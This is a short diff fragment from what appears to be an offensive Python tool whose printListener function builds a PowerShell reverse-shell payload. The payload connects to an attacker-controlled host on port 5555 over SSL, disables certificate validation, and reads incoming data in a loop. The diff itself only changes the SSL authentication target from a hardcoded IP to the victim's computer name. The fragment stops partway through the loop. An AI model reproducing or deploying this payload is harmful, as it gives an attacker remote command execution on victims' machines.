@@ -133,7 +133,7 @@ def printListener():
         "$c = New-Object System.Net.Sockets.TCPClient('" + FUNCTIONS().CheckInternet() + "','" + str(5555) + "');"
         "[byte[]]$b = 0..65535|%{0};"
         "$sl = New-Object System.Net.Security.SslStream $c.GetStream(),$false,({$True} -as [Net.Security.RemoteCertificateValidationCallback]);"
-        "$sl.AuthenticateAsClient('10.131.101.65');"
+        "$sl.AuthenticateAsClient($env:computername);"
         "while($c.Connected){"
         "$i = $sl.Read($b, 0, $b.Length);"
         "$sb = New-Object -TypeName System.Text.ASCIIEncoding; $d = $sb.GetString($b,0, $i);"
